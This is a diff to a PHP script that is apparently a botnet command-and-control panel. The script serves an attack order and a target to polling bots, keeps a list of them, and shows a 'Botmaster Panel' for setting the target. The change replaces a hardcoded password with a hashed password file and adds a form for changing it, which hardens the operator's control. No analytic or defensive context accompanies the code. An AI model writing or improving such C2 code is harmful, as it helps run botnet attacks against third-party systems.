@@ -22,6 +22,7 @@
 
 $configFile = "data/config";
 $botFile = "data/bots";
+$passFile = "data/password";
 
 // load config (parameters for attack)
 $conf = fopen($configFile, "r");
@@ -33,6 +34,13 @@ $order = $content[0];
 $target = $content[1];
 
 $timestamp = time();
+
+// load password
+$pw = fopen($passFile, "r");
+$pwContent = fread($pw, filesize($passFile));
+fclose($pw);
+$curPw = explode("\n", $pwContent);
+$curPw = $curPw[0];
 
 if($_GET['p'] == "bot") {
 	print $order."\n".$target;
@@ -71,7 +79,7 @@ if($_GET['p'] == "bot") {
 	fwrite($writeBots, $writeBotsContent);
 	fclose($writeBots);
 }
-elseif($_GET['p'] == "password") {
+elseif(hash("sha512", $_GET['p']) == $curPw) {
 	// delete timed out bots
 	// read bots
         $bots = fopen($botFile, "r");
@@ -102,6 +110,15 @@ elseif($_GET['p'] == "password") {
 		$order = $_GET['order'];
 		$target = $_GET['target'];
 	}
+
+	// save new password
+	if($_GET['np'] != "") {
+		$writePw = fopen($passFile, "w");
+		fwrite($writePw, hash("sha512", $_GET['np'])."\n");
+		fclose($writePw);
+		$curPw = $_GET['np'];
+	}
+
 	// display panel
 	print "<h1>Botmaster Panel</h1>";
 	print "<table border=\"1\">";
@@ -119,13 +136,27 @@ elseif($_GET['p'] == "password") {
 	print "</tr>";
 	print "</table>";
 
+	// change orders form
 	print "<form method=\"get\">";
 	print "<input type=\"radio\" name=\"order\" value=\"yes\" checked>yes";
 	print "<input type=\"radio\" name=\"order\" value=\"no\">no";
         print "<input type=\"text\" name=\"target\" value=\"".$target."\"><br>";
-	print "<input type=\"hidden\" name=\"p\" value=\"".$_GET['p']."\">";
+	if ($_GET['np'] == "") {
+		print "<input type=\"hidden\" name=\"p\" value=\"".$_GET['p']."\">";
+	}
+	else {
+		print "<input type=\"hidden\" name=\"p\" value=\"".$_GET['np']."\">";
+	}
         print "<input type=\"submit\" value=\"Submit\">";
         print "</form>";
+
+	// change password form
+	print "<form method=\"get\">";
+        print "<input type=\"password\" name=\"np\" placeholder=\"new password\"><br>";
+        print "<input type=\"password\" name=\"p\" placeholder=\"old password\">";
+        print "<input type=\"submit\" value=\"Submit\">";
+        print "</form>";
+
 }
 else {
 	// login form
